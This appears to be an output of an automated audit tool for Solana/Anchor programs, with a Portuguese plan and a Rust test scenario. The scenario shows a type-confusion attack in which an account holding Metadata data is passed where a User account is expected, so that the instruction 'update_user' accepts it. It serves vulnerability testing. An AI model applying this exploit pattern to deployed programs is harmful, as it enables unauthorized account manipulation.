{
  "plan": "O cenário monta uma conta `user` que pertence ao programa mas contém dados de `Metadata` (32 bytes com um Pubkey controlado pelo atacante), e uma conta `authority` que assina. O baseline usa uma conta `user` legítima com dados de `User` cujo authority é a chave do signer, provando que o cenário está correto. O ataque substitui a conta `user` por uma conta com dados de `Metadata` cujo campo `account` é a chave do signer, explorando a desserialização sem discriminador. O efeito medido é que a instrução aceita a conta de tipo errado e retorna sucesso, o que o uso legítimo não faria com dados de `Metadata`.",
  "scenario": "let authority = Pubkey::new_unique();
let user_legit = Pubkey::new_unique();
let user_meta = Pubkey::new_unique();

// Conta legítima: dados de User (authority = signer)
let user_data_legit = anchor_account_data("User", &(authority,));
let user_account_legit = account(&env.program_id, &user_data_legit, None);

// Conta maliciosa: dados de Metadata (account = signer)
let meta_data = anchor_account_data("Metadata", &(authority,));
let user_account_meta = account(&env.program_id, &meta_data, None);

let authority_account = wallet(1_000_000_000);

// Baseline: uso legítimo com User
let ix_baseline = env.anchor_ix("update_user", &(), vec![
    AccountMeta::new_readonly(user_legit, false),
    AccountMeta::new_readonly(authority, true),
]);
let contas_baseline = vec![
    (user_legit, user_account_legit),
    (authority, authority_account.clone()),
];
let r_baseline = env.baseline("update_user com User legítimo", &ix_baseline, &contas_baseline);

// Ataque: substitui user por conta com dados de Metadata
let ix_attack = env.anchor_ix("update_user", &(), vec![
    AccountMeta::new_readonly(user_meta, false),
    AccountMeta::new_readonly(authority, true),
]);
let contas_attack = vec![
    (user_meta, user_account_meta),
    (authority, authority_account),
];
let r_attack = env.attack("update_user com Metadata no lugar de User", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    env.effect("instrução aceitou conta de tipo Metadata como User", true);
}"
}

